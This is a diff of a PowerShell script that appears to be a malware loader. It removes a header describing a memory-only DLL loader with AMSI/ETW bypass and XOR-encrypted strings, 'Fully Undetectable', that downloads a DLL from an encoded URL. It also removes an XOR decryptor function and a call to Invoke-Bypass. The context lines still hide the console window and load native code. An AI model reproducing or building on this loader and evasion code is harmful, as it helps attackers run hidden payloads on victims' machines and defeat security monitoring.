@@ -49,27 +49,6 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
 
 
-<#
-.SYNOPSIS
-    Memory-only DLL loader with AMSI/ETW bypass + XOR encryption
-.DESCRIPTION
-    Downloads DLL from Base64-encoded URL and manually maps it into memory.
-    No disk write. All strings are XOR-encrypted.
-.NOTES
-    Made by Potato - Fully Undetectable
-#>
-
-
-# ================================================================
-#  ★★★ ২. XOR ডিক্রিপ্টর ★★★
-# ================================================================
-function Xor-Decrypt {
-    param([string]$Encoded, [byte]$Key = 0x5A)
-    $bytes = [Convert]::FromBase64String($Encoded)
-    for ($i=0; $i -lt $bytes.Length; $i++) { $bytes[$i] = $bytes[$i] -bxor $Key }
-    return [System.Text.Encoding]::UTF8.GetString($bytes)
-}
-
 
 function Invoke-Finalize {
     try {
@@ -262,8 +241,6 @@ public static class NativeLoader
 '@
 
 
-# ৪.১ – BYPASS কল করো
-Invoke-Bypass
 
 try {
     $type = Add-Type $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
